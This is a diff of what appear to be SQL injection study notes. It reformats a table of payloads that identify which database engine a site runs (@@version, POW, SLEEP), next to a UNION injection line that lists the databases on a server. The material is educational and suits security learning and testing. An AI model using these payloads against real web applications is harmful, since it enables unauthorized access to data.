@@ -77,11 +77,11 @@ We keep adding 1,2,3,4... until something actually returns for our query, this m
 
 Below is a list of payload we can use to identify what SQL we are dealing:
 
-|Payload|When to Use|Expected Output|Wrong Output|
-|---|---|---|---|
-|`SELECT @@version`|When we have full query output|MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'|In MSSQL it returns MSSQL version. Error with other DBMS.|
-|`SELECT POW(1,1)`|When we only have numeric output|`1`|Error with other DBMS|
-|`SELECT SLEEP(5)`|Blind/No Output|Delays page response for 5 seconds and returns `0`.|Will not delay response with other DBMS|
+| Payload            | When to Use                      | Expected Output                                     | Wrong Output                                              |
+| ------------------ | -------------------------------- | --------------------------------------------------- | --------------------------------------------------------- |
+| `SELECT @@version` | When we have full query output   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
+| `SELECT POW(1,1)`  | When we only have numeric output | `1`                                                 | Error with other DBMS                                     |
+| `SELECT SLEEP(5)`  | Blind/No Output                  | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS                   |
 Before we use union query to extract database, we first need to see the DB's structure, to do that we can first obtain info on INFORMATION_SCHEMA DB, the SCHEMATA table contains names of DB available in the server, so we can query it with something like:
 ```
 cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
